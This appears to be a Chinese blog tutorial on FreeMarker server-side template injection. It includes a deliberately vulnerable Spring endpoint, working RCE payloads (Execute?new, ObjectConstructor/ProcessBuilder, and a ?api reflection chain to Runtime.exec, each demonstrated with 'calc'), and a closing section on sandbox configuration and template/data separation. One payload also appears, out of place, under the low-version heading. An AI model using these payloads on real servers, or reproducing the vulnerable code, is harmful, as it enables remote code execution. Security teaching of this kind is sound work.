---
title: "Java SSTI · FreeMarker"
date: 2026-04-12 00:00:00 +0800
categories:
  - ssti
  - web
  - security
tags:
  - java
  - freemarker
---
**模板**（Template）、**数据**（Context上下文）、**输出**（Writer）。

- **FreeMarker**：`Template` + `Map数据` → `process()` → `Writer输出`
- **Velocity**：`Template` + `VelocityContext` → `merge()` → `Writer输出`、

 **调用链**：解析→访问者→反射

| 执行阶段           | FreeMarker 核心调用链                                        | Velocity 核心调用链                                          |
| :----------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| **1. 解析**        | `FMParser` 解析文本流，切分为 `TemplateElement` 语法树节点（如 `AssignInstruction`、`DollarVariable`） | `JJTParser` 解析文本流，切分为 `AST` 语法树节点（如 `ASTSetDirective`、`ASTReference`） |
| **2. 遍历**        | `Environment.visit()` 遍历语法树，调用节点的 `accept` 方法   | `SimpleNode.render()` → `execute()` 遍历子节点，调用 `render` 方法 |
| **3. 反射/实例化** | 内建函数 `?new` 通过反射实例化实现 `TemplateModel` 的类      | 依赖上下文中注入的 Java 对象，通过 Introspector 进行反射方法调用 |

下面我们以 FreeMarker 为例讲解一下漏洞的全流程：

## 语法

**FTL 指令**：以 `<#` 开头，用于控制逻辑

```freemarker
<#assign seq = ["foo", "bar", "baz"]>   <!-- 创建变量 -->
<#if user == "admin">...</#if>          <!-- 条件判断 -->
```

**插值表达式**：`${...}` 用于输出变量值

```freemarker
${100 + 5}      <!-- 输出 105 -->
${seq[1]}       <!-- 输出 bar -->
```

**内建函数**：`?函数名` 用于拓展模板能力，也是 SSTI 漏洞的核心利用点

```freemarker
${"freemarker.template.utility.Execute"?new()("calc")}
```

`?new` 可实例化任意实现了 `TemplateModel` 接口的类，其内部包含两个关键步骤：

1. 调用 `TemplateClassResolver.resolve(className)` 进行类解析。
2. 通过类加载拿到 Class 后，调用 `newInstance()` 完成实例化。

## 代码示例

```java
@PostMapping("/freemarker")
public String freemarker(@RequestParam String template) {
    Configuration cfg = new Configuration();
    StringTemplateLoader loader = new StringTemplateLoader();
    loader.putTemplate("malicious", template);   // 用户输入直接作为模板
    cfg.setTemplateLoader(loader);
    
    Template t = cfg.getTemplate("malicious");
    StringWriter out = new StringWriter();
    t.process(null, out);   // 触发渲染
    return out.toString();
}
```

### 低版本绕过姿势（2.3.23 之前）

**第一步：恶意payload**

```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("calc")}
```

**第二步：模板解析，生成语法树**

解析器会识别出 FTL 标签和插值，切分原始字符并划分类型。

1.<#assign ex=...>为FTL 赋值指令
2."freemarker.template.utility.Execute"?new()为函数调用

3.${ex("calc")}为插值表达式

**第三步：节点执行 —— 内建函数 `?new` 实例化危险类**

执行到 `?new` 时，引擎底层会调用 `TemplateClassResolver.resolve(className)`。**需要特别注意的是，FreeMarker 默认使用的是 `UNRESTRICTED_RESOLVER`，该解析器不进行任何安全校验**，直接通过 `ClassUtil.forName()` 加载指定的类，并调用 `newInstance()` 实例化。

**`Execute` 类源码**（早期版本内置的危险类，可直接执行命令）：

```
// freemarker.template.utility.Execute
public class Execute implements TemplateMethodModel {
    
    // 唯一的方法 —— 执行外部命令
    public Object exec(List arguments) throws TemplateModelException {
        // 调用 Runtime.getRuntime().exec()返回命令的标准输出
    }
}
```

**第四步：插值执行 —— `${ex("calc")}` 触发 RCE**

语法树继续遍历，来到了 `${ex("calc")}` 这个 `DollarVariable` 节点。

**核心调用链**：

```
<#assign obj="freemarker.template.utility.ObjectConstructor"?new()>
 ${obj("java.lang.ProcessBuilder","calc").start()}
```

```
DollarVariable.accept()
  → 计算内部表达式: ex("calc")
    → MethodCall.exec()
      → Execute.exec("calc")  // 调用危险类的核心方法
        → Runtime.getRuntime().exec("calc")
```

最终底层执行系统命令，弹出计算器，RCE 漏洞完整触发。

### 高版本绕过姿势

官方在 2.3.17 废弃了 `Execute` 类，并在 **2.3.23 版本中将其彻底删除**。在如今普遍使用的 Spring Boot 2.x/3.x（通常集成 2.3.30+）中，上述 Payload 会报类找不到的错误。

但只要 `?new` 的默认解析器未被限制，我们完全可以利用官方保留的其他类来实现“无中生有”，最经典的是利用 `ObjectConstructor` 动态构造任意 Java 对象：

**高版本 Payload**：

```
<#assign obj="freemarker.template.utility.ObjectConstructor"?new()>
 ${obj("java.lang.ProcessBuilder","calc").start()}
```

通过 `ObjectConstructor` 实例化原生的 `java.lang.ProcessBuilder`，直接调用其 `start()` 方法启动系统进程。这种方式完全不依赖被删除的工具类，适用范围更广。

#### 沙箱限制下的 `?api` 反射链

如果开发者看到了上面的利用方式，将解析器配置为了安全的 `NON_AUTOLOADABLE_RESOLVER`（白名单模式），彻底封死了 `?new` 实例化任意类的途径。此时还能打吗？

答案是可以的，利用内建函数 `?api`。

**原理**：FreeMarker 出于安全考虑，将传入数据上下文的 Java 对象包装成了 `TemplateModel` 接口，屏蔽了原生的危险方法。?api` 能直接暴露底层 Java 对象的原始 API，从而开启一条毫无阻碍的链式反射 RCE 链条。

**前提条件**：只要开发者在代码中向模板传递了**任意一个** Java 对象（例如在 Spring 中很常见的 `request` 对象），攻击者就可以以此为跳板。

**Payload 示例**（假设上下文中存在 `request` 对象）：

```
<#assign cl=request?api.class.getClassLoader()>
<#assign rt=cl.loadClass("java.lang.Runtime")>
${rt.getMethod("exec",cl.loadClass("java.lang.String")).invoke(rt.getMethod("getRuntime"),"calc")}
```

1. `request?api.class`：利用 `?api` 突破包装，拿到 `request` 真实的 `Class` 对象。
2. `.getClassLoader()`：通过真实的 Class 对象获取类加载器 `ClassLoader`。
3. 后续就是标准的 Java 反射：用 `ClassLoader` 加载 `Runtime` 类，获取 `exec` 方法，最后 `invoke` 触发命令执行。

## 防御

防御的核心在于限制模板引擎的“越权”行为，即防止它脱离数据渲染的职责去执行 Java 代码。沙箱机制的本质是：**防无中生有（限制实例化），限链式调用（限制反射）**。

**1. 引擎能力限制（配置沙箱）**：

| 攻击路径                   | 防御配置                              | 原理说明                                                     |
| -------------------------- | ------------------------------------- | ------------------------------------------------------------ |
| 通过 `?new` 实例化危险类   | `NON_AUTOLOADABLE_RESOLVER`           | 切换为白名单模式，仅允许加载被模板显式 `import` 的宏库类，拒绝无中生有 |
| 通过 `?api` 进行反射链调用 | `setAPIBuiltinEnabled(false)`         | 禁用 `?api` 内建函数，阻断通过 `obj?api.class.getClassLoader()` 获取底层类的路径 |
| 通过预置变量直接执行       | `setSharedVariable("execute", null)`  | 清除官方预留的危险内置变量（低版本适用）                     |
| 通过解包获取底层类         | `setDisableObjectWrapperUnwrap(true)` | 禁用 `unwrap`，防止模板变量被还原为原生 Java 对象，切断反射链 |

**2. 应用架构设计：**

除了通过协议约束引擎，更根本的解决方式是**分离模板与数据**。编写静态模板文件（如 `index.ftl`），在项目启动时预编译，内容不随用户输入改变。用户输入仅能通过 `model.addAttribute()` 作为**数据**传递给模板，在模板的插值 `${}` 中被安全地渲染。
